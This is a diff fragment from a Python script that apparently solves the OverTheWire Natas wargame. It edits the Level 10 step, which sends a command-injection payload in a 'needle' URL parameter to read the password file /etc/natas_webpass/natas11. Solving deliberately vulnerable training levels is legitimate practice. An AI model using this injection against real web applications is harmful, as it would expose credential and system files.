@@ -204,7 +204,7 @@ except requests.exceptions.RequestException as e:
 
 # Level 10
 try:
-  cmd_inject_payload = '/?needle="" /etc/natas_webpass/natas11 ' + "#"
+  cmd_inject_payload = '/?needle="" /etc/natas_webpass/natas11 \#'
   response = requests.get(url_dict["natas10"]+cmd_inject_payload, auth=cred_dict["natas10"])
   response.raise_for_status()
   print("\nLevel 10")
